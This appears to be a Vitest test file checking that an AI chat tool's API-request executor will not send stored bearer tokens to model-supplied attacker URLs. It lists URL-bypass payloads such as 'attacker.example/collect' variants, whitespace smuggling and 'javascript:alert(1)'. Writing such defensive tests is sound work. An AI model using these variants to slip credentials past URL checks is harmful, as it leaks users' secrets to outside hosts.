import { Chat } from '@ai-sdk/vue'
import { createWorkspaceStore } from '@scalar/workspace-store/client'
import type { ServerObject } from '@scalar/workspace-store/schemas/v3.2/strict/openapi-document'
import type { UIDataTypes, UIMessage } from 'ai'
import { afterEach, describe, expect, it, vi } from 'vitest'

import { createDocumentSettings } from '@/helpers'
import type { Tools } from '@/state/state'

import { executeRequestTool } from './execute-request'

const documentName = 'test/private'

const prepareRequest = async (
  path: string,
  servers?: ServerObject[],
  proxyUrl = '',
): Promise<Parameters<typeof executeRequestTool>[0]> => {
  const workspace = createWorkspaceStore()
  await workspace.addDocument({
    name: documentName,
    document: {
      openapi: '3.1.0',
      info: { title: 'Private API', version: '1.0.0' },
      paths: {},
      ...(servers ? { servers } : {}),
      components: { securitySchemes: { bearer: { type: 'http', scheme: 'bearer' } } },
      security: [{ bearer: [] }],
    },
  })
  workspace.auth.setAuthSecrets(documentName, 'bearer', {
    type: 'http',
    'x-scalar-secret-token': 'stored-secret',
  })
  const input = { method: 'GET', path, documentName, documentIdentifier: documentName }
  const chat = new Chat<UIMessage<unknown, UIDataTypes, Tools>>({
    messages: [
      {
        id: 'assistant-1',
        role: 'assistant',
        parts: [
          {
            type: 'tool-execute-request',
            toolCallId: 'request-1',
            state: 'input-available',
            input,
          },
        ],
      },
    ],
  })
  return { documentSettings: createDocumentSettings(workspace), chat, input, toolCallId: 'request-1', proxyUrl }
}

describe('execute-request', () => {
  afterEach(() => vi.restoreAllMocks())

  it.each(['', 'https://proxy.example.com'])(
    'does not send stored credentials to an absolute model URL without a server (proxy %s)',
    async (proxyUrl) => {
      const request = await prepareRequest('https://attacker.example/collect', undefined, proxyUrl)
      expect(request.documentSettings[documentName]?.activeServer).toBeNull()
      const fetch = vi.spyOn(globalThis, 'fetch').mockResolvedValue(Response.json({ ok: true }))

      const result = await executeRequestTool(request)

      expect(fetch.mock.calls).toStrictEqual([])
      expect(result).toStrictEqual({
        success: false,
        error: { code: 'FAILED_TO_EXECUTE_REQUEST', detail: 'Select a server before sending an API request.' },
      })
      await vi.waitFor(() =>
        expect(request.chat.messages[0]?.parts.find((part) => part.type === 'tool-execute-request')?.state).toBe(
          'output-error',
        ),
      )
      expect(request.chat.messages[0]?.parts[0]).toStrictEqual({
        type: 'tool-execute-request',
        toolCallId: 'request-1',
        state: 'output-error',
        input: request.input,
        errorText: 'Select a server before sending an API request.',
        output: undefined,
      })
    },
  )

  it.each([
    'https://attacker.example/collect',
    '//attacker.example/collect',
    '/\\attacker.example/collect',
    '\\attacker.example/collect',
    '/\t/attacker.example/collect',
    '/\n/attacker.example/collect',
    ' https://attacker.example/collect',
    'javascript:alert(1)',
  ])('rejects model destination %j even with a configured server', async (path) => {
    const request = await prepareRequest(path, [{ url: 'https://api.example.com/v1' }])
    const fetch = vi.spyOn(globalThis, 'fetch').mockResolvedValue(Response.json({ ok: true }))

    const result = await executeRequestTool(request)

    expect(fetch.mock.calls).toStrictEqual([])
    expect(result.success).toBe(false)
    await vi.waitFor(() =>
      expect(request.chat.messages[0]?.parts.find((part) => part.type === 'tool-execute-request')?.state).toBe(
        'output-error',
      ),
    )
  })

  it.each([undefined, [], [{ url: '' }], [{ url: '   ' }]])(
    'rejects a relative path without a usable server %j',
    async (servers) => {
      const request = await prepareRequest('/pets', servers)
      const fetch = vi.spyOn(globalThis, 'fetch').mockResolvedValue(Response.json({ ok: true }))

      const result = await executeRequestTool(request)

      expect(fetch.mock.calls).toStrictEqual([])
      expect(result.success).toBe(false)
      await vi.waitFor(() =>
        expect(request.chat.messages[0]?.parts.find((part) => part.type === 'tool-execute-request')?.state).toBe(
          'output-error',
        ),
      )
    },
  )

  it.each(['ftp://api.example.com', 'https://', 'http://[invalid'])('rejects unusable server URL %s', async (url) => {
    const request = await prepareRequest('/pets', [{ url }])
    const fetch = vi.spyOn(globalThis, 'fetch').mockResolvedValue(Response.json({ ok: true }))

    const result = await executeRequestTool(request)

    expect(fetch.mock.calls).toStrictEqual([])
    expect(result.success).toBe(false)
    await vi.waitFor(() =>
      expect(request.chat.messages[0]?.parts.find((part) => part.type === 'tool-execute-request')?.state).toBe(
        'output-error',
      ),
    )
  })

  it.each([
    ['', 'https://api.example.com/v1/'],
    ['https://proxy.example.com', 'https://proxy.example.com/?scalar_url=https%3A%2F%2Fapi.example.com%2Fv1%2F'],
  ])('preserves a valid root endpoint with proxy %s', async (proxyUrl, expectedUrl) => {
    const request = await prepareRequest('/', [{ url: 'https://api.example.com/v1' }], proxyUrl)
    const fetch = vi.spyOn(globalThis, 'fetch').mockResolvedValue(Response.json({ ok: true }))

    const result = await executeRequestTool(request)

    expect(result.success).toBe(true)
    expect(fetch.mock.calls).toStrictEqual([
      [expectedUrl, { method: 'GET', body: undefined, headers: { Authorization: 'Bearer stored-secret', Cookie: '' } }],
    ])
  })

  it('preserves a selected relative server resolved against the page origin', async () => {
    const request = await prepareRequest('/pets', [{ url: '/api' }])
    const fetch = vi.spyOn(globalThis, 'fetch').mockResolvedValue(Response.json({ ok: true }))

    const result = await executeRequestTool(request)

    expect(result.success).toBe(true)
    expect(fetch.mock.calls).toStrictEqual([
      [
        `${window.location.origin}/api/pets`,
        { method: 'GET', body: undefined, headers: { Authorization: 'Bearer stored-secret', Cookie: '' } },
      ],
    ])
  })

  it('preserves server variables, base paths, query values and credentials for a valid request', async () => {
    const request = await prepareRequest('/pets?next=https://other.example/a', [
      {
        url: 'https://{host}/v1',
        variables: { host: { default: 'api.example.com' } },
      },
    ])
    const fetch = vi.spyOn(globalThis, 'fetch').mockResolvedValue(Response.json({ ok: true }))

    const result = await executeRequestTool(request)

    expect(result.success).toBe(true)
    expect(fetch.mock.calls).toStrictEqual([
      [
        'https://api.example.com/v1/pets?next=https%3A%2F%2Fother.example%2Fa',
        { method: 'GET', body: undefined, headers: { Authorization: 'Bearer stored-secret', Cookie: '' } },
      ],
    ])
    await vi.waitFor(() =>
      expect(request.chat.messages[0]?.parts.find((part) => part.type === 'tool-execute-request')?.state).toBe(
        'output-available',
      ),
    )
  })
})
